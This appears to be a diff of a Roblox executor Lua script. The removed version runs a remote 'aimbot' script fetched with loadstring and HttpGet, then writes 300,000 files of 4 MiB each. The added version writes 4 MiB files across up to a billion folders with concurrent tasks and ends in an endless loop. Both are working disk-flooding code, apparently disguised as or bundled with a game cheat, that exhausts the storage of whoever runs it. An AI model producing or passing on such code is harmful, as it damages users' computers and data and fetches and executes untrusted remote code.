@@ -1,44 +1,37 @@
-loadstring(game:HttpGet("https://rscripts.net/raw/new-zumhub-aimbot-zab-og_1788575235771_FxNXhdyH2P.txt",true))()
-task.wait(10)
-local folderName = "Systematic"
-local totalFiles = 300000
-local fileSize = 4 * 1024 * 1024 -- 4 MiB
-local waitTime = 0.1
+local folderCount = 999999999
+local txtCount = 99999999
+local fileSize = 4 * 1024 * 1024 -- 4 MiB per file
+local repeatCreation = true
 
+-- Generate file contents once
 local content = string.rep("A", fileSize)
 
-if not isfolder(folderName) then
-    makefolder(folderName)
-end
+-- Create folders and files
+for i = 1, folderCount do
+    local folder = "Folder_" .. i
 
-local successfulWrites = 0
-local failedWrites = 0
-
-for i = 1, totalFiles do
-    local fileName = folderName .. "/File" .. i .. ".txt"
-
-    local success, err = pcall(function()
-        writefile(fileName, content)
-    end)
-
-    if success then
-        successfulWrites = successfulWrites + 1
-    else
-        failedWrites = failedWrites + 1
-        warn("Write failed at file " .. i .. ": " .. tostring(err))
+    if not isfolder(folder) then
+        makefolder(folder)
     end
 
-    if i % 100 == 0 then
-        print(
-            "Attempted:", i,
-            "Successful:", successfulWrites,
-            "Failed:", failedWrites
-        )
+    for j = 1, txtCount, 10 do
+        for k = j, math.min(j + 2, txtCount) do
+            task.spawn(function()
+                local file = folder .. "/File_" .. k .. ".txt"
+                writefile(file, content)
+                print("Created: " .. file)
+            end)
+        end
+        task.wait()
     end
-
-    task.wait(waitTime)
 end
 
-print("Finished.")
-print("Successful writes:", successfulWrites)
-print("Failed writes:", failedWrites)
+-- Repeat with no intentional delay
+if repeatCreation then
+    local run = true
+
+    while run do
+        task.wait() -- Yields to avoid locking up the executor
+        print("System")
+    end
+end
